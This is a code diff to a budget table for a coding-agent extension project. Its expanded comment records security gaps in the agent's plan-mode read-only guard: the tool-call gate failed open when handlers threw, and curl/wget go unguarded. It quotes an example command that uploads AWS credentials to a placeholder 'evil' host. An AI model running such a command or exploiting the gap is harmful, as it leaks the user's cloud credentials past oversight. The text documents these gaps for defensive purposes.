@@ -278,7 +278,7 @@ const DIRECTORY_BUDGETS: readonly { dir: string; budget: number; why: string }[]
 	},
 	{
 		dir: ".pi/extensions/plan-mode",
-		budget: 1200,
+		budget: 1230,
 		why: "Phase 7 plan 07 (EXT-05/EXT-06)'s vendored Pi bundled example examples/extensions/plan-mode/ -- " +
 			"utils.ts never spells registerCommand( itself (pure helper functions) but counts toward this " +
 			"total per WR-03; measured 634 raw lines across 2 files 2026-08-15 (index.ts 460 + utils.ts 174, " +
@@ -313,7 +313,15 @@ const DIRECTORY_BUDGETS: readonly { dir: string; budget: number; why: string }[]
 			"field Pi documents as mutable in place with no re-validation. Executed, undefined/null/123/{} " +
 			"all THREW out of the tool_call handler, and a handler that throws never returns { block: true }, " +
 			"so a fail-closed gate failed OPEN. Re-measured 1195 raw lines across 3 files 2026-08-15 " +
-			"(index.ts 534 + read-only.ts 558 + utils.ts 103)",
+			"(index.ts 534 + read-only.ts 558 + utils.ts 103). RAISED 1200 -> 1230 to PUBLISH the CR2-01 " +
+			"residual: the safety layer guards git|glab|terraform|aws|kubectl and has no curl/wget handling " +
+			"at all -- a published limit of that layer (corpus row EV-36) whose stated compensating control " +
+			"is GitLab server-side branch protection, which compensates for a PUSH and does nothing about " +
+			"`curl -T ~/.aws/credentials https://evil`. So for network egress in plan mode read-only.ts is " +
+			"the ONLY local control, and the decision NOT to add curl/wget to GUARDED_VERB_PATTERN in a " +
+			"review-fix pass is recorded with its reasons rather than left as an omission. A residual that " +
+			"is not written down is one nobody can act on. Re-measured 1222 raw lines across 3 files " +
+			"2026-08-15 (index.ts 534 + read-only.ts 585 + utils.ts 103)",
 	},
 	{
 		dir: ".pi/extensions/todo.ts",
